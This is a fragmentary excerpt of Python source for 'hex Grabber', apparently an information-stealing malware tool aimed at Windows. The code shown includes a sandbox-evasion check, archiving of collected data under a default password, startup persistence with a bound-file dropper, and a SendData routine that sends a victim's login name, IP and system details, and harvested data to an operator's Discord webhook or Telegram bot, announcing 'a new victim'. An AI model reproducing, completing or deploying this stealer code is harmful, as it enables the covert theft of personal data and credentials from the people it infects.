# Python 3.10+
# Author: hex-c
# Github: https://github.com/hex-c/hex-Grabber
# Encoding: UTF-8
...
Logger = logging.getLogger("hex Grabber")
...
class VmProtect:
    ...
    def checkHTTPSimulation() -> bool: # Checks if the user is simulating a fake HTTPS connection or not
        ...
        try:
            http.request('GET', f'https://hex-{Utility.GetRandomString()}.in')
        except Exception:
            return False
        else:
            return True
...
class hexGrabber:
    ...
    def CreateArchive(self) -> tuple[str, str]: # Create archive of the data collected
        ...
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            ...
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or "hex123"
    ...
    def SendData(self) -> None: # Sends data to the webhook
        ...
        filename = "hex-%s.%s" % (os.getlogin(), extention)
        ...
        match Settings.C2[0]:
            case 0: # Discord Webhook
                image_url = "https://raw.githubusercontent.com/f4kedre4lity/hex-Grabber/main/.github/workflows/image.png"
                    ...
                    "embeds": [
                        {
                            ...
                            "url": "https://github.com/f4kedre4lity/hex-Grabber",
                            "color": 34303,
                            "footer": {
                                "text": "Grabbed by hex Grabber | https://github.com/f4kedre4lity/hex-Grabber"
                            },
                            "thumbnail": {
                                "url": image_url
                            }
            ...
            case 1: # Telegram Bot
                payload = {
                    'caption': f'<b>hex Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
                    'parse_mode': 'HTML'
                }
...
if __name__ == "__main__" and os.name == "nt":
    ...
    if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile(boundFileSrc:= os.path.join(sys._MEIPASS, "bound.hex")):
        try:
